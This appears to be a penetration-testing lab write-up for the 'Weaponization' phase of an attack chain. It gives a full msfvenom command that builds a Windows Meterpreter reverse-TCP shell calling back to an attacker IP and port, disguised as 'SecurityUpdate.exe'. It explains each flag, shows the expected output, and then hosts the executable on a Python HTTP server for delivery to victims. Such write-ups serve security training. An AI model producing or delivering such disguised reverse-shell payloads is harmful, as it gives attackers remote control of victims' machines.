# Weaponization

## Objective:
Create a malicious payload and a delivery mechanism for the attack.

## Action:
1. Generate Malicious Payload with MSFVenom: 

    Use **MSFVenom**, a tool for creating payloads, to generate a **malicious executable** that executes a **Meterpreter shell** (Metasploit's remote control payload). 

![image](https://github.com/user-attachments/assets/a7b94074-04e0-431c-b011-2252d538c3de)

### 🔹 Payload Generation Command:
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.19.19.134 LPORT=4444 -f exe -o SecurityUpdate.exe
```

### 🔹 Explanation of the Command:
| Parameter | Explanation |
|-----------|-------------|
| `msfvenom` | A tool to generate payloads for penetration testing. |
| `-p windows/x64/meterpreter/reverse_tcp` | Creates a **64-bit reverse shell** for Windows. |
| `LHOST=10.19.19.134` | The attacker's IP address. |
| `LPORT=4444` | The attacker's listening port. |
| `-f exe` | Specifies the output format as a Windows **executable** (`.exe`). |
| `-o SecurityUpdate.exe` | Saves the generated payload as `SecurityUpdate.exe`. |

### 🔹 Checking the Payload Type:
Run the `file` command:
```bash
file SecurityUpdate.exe
```
#### Expected Output:
```
SecurityUpdate.exe: PE32+ executable (GUI) x86-64, for MS Windows, 3 sections
```
- ✅ **64-bit Windows Executable**
- ✅ **Designed for Graphical UI**
- ✅ **Portable Executable (PE) format**

2. Host the Payload Using a Python HTTP Server.

   Host the payload on a **Python HTTP server** running on port `8000`:

![image](https://github.com/user-attachments/assets/1c66b5c9-4f4c-4285-8f5a-d86b5a14c244)

### Command Explanation:

```
python3 -m http.server 8000
```

1. `python3` – Runs Python version 3.
2. `-m http.server` – Uses Python’s built-in web server module to start a temporary HTTP server.
3. `8000` – Specifies that the server should run on port 8000 (you can change this to any available port).

### Output of the Command:

  - `"Serving HTTP on 0.0.0.0 port 8000"` – The server is now running and accessible from any computer on the network.
  - `"http://0.0.0.0:8000/"` – You (or others on the network) can access it by typing http://your-ip:8000/ in a web browser.

### What This Means:

  - If you run this command in a folder, Python will share all the files in that folder over HTTP.
  - You can download files from this machine by visiting `http://your-ip:8000/` in a browser or using `wget` or `curl`.
  - Useful for quick file sharing or setting up a local web server for testing.
